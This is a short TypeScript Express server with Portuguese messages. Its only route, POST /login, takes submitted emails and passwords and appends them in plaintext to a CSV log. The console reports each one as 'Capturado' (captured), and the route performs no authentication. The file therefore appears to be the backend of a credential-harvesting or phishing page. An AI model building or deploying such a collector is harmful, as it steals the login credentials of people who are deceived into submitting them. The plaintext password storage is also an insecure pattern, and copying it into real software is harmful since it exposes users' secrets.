import express from 'express';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import bodyParser from 'body-parser';
import { setupSwagger } from './swagger';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Setup Swagger
setupSwagger(app);

const logPath = path.join(__dirname, '../logs/login.csv');

if (!fs.existsSync(logPath)) {
  fs.writeFileSync(logPath, 'timestamp,email,password\n');
}

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const log = `"${timestamp}","${email}","${password}"\n`;

  fs.appendFile(logPath, log, (err) => {
    if (err) {
      console.error('Erro ao salvar log:', err);
      return res.status(500).send('Erro interno');
    }
    console.log(`Capturado: ${email}`);
    return res.status(200).send('Login recebido');
  });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
  console.log(`Documentação disponível em http://localhost:${PORT}/docs`);
});
